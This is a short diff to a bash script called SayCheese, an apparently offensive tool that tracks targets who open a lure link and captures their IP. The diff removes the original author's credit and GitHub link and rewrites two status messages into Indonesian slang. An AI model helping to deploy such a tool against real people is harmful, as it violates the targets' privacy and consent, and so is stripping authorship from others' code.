@@ -1,8 +1,5 @@
 #!/bin/bash
 # SayCheese v1.2
-# Coded by: @linux_choice (twitter)
-# Github: https://github.com/thelinuxchoice/saycheese
-
 trap 'printf "\n";stop' 2
 
 banner() {
@@ -78,7 +75,7 @@ while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target membuka link broooo!\n"
 catch_ip
 rm -rf ip.txt
 
@@ -205,7 +202,7 @@ website_template="${website_template:-${default_website_template}}"
 if [[ -f $website_template ]]; then
 
 if [[ $website_template == *'index.php'* ]]; then
-printf "\e[1;91m[!] Rename your template and try again.\e[0m\n"
+printf "\e[1;91m[!] Ganti template and coba lagi bro.\e[0m\n"
 exit 1
 fi
 
